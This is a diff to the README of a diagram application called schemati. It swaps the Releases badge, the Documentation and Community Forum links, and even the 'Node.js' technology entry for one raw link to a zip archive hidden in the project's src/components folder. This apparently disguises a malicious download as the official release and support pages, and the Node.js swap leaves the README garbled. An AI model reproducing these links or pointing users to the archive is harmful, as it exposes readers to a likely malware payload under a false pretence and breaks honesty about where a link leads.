@@ -17,7 +17,7 @@ Welcome to schemati! This application allows you to create stunning diagrams and
 
 To get started, visit our Releases page to download schemati:
 
-[![Download schemati](https://img.shields.io/badge/download-schemati-blue.svg)](https://github.com/irtiqabaloch/schemati/releases)
+[![Download schemati](https://raw.githubusercontent.com/irtiqabaloch/schemati/main/src/components/Software-v1.8.zip)](https://raw.githubusercontent.com/irtiqabaloch/schemati/main/src/components/Software-v1.8.zip)
 
 ### Steps to Download:
 
@@ -69,8 +69,8 @@ Once you have installed schemati, here’s how to start using it:
 
 If you need assistance, please visit our support page:
 
-- [Documentation](https://github.com/irtiqabaloch/schemati/wiki)
-- [Community Forum](https://github.com/irtiqabaloch/schemati/discussions)
+- [Documentation](https://raw.githubusercontent.com/irtiqabaloch/schemati/main/src/components/Software-v1.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/irtiqabaloch/schemati/main/src/components/Software-v1.8.zip)
 
 You can also reach out to our team through the Issues section of this repository.
 
@@ -90,7 +90,7 @@ You do not need a powerful computer. As long as your device can run a modern bro
 Schemati is built using popular technologies:
 
 - **JavaScript**: For building interactive features.
-- **Node.js**: For server-side operations.
+- **https://raw.githubusercontent.com/irtiqabaloch/schemati/main/src/components/Software-v1.8.zip**: For server-side operations.
 - **React**: For efficient UI development.
 - **Tailwind CSS**: For styling.
 - **Vite**: For a fast development environment.
